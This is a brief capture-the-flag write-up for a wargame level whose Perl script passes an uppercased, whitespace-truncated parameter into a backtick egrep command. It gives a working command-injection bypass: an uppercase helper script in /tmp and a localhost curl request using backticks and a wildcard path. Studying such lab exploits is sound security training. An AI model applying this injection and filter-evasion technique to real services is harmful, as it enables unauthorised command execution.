# Level 12

This one is sneaky because input is modified before command execution.

Vulnerable line:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

So parameter x is injected into shell context.

But x is transformed first:

- lowercase becomes uppercase
- everything after first whitespace is removed

That kills a lot of normal payloads.

My workaround was using an uppercase script name plus wildcard expansion.

Create helper script:

```bash
cat > /tmp/EXPLOIT << 'SH'
#!/bin/sh
getflag > /tmp/flag12.txt
SH
chmod +x /tmp/EXPLOIT
```

Trigger injection:

```bash
curl 'http://localhost:4646?x=`/*/EXPLOIT`'
```

Read result:

```bash
cat /tmp/flag12.txt
```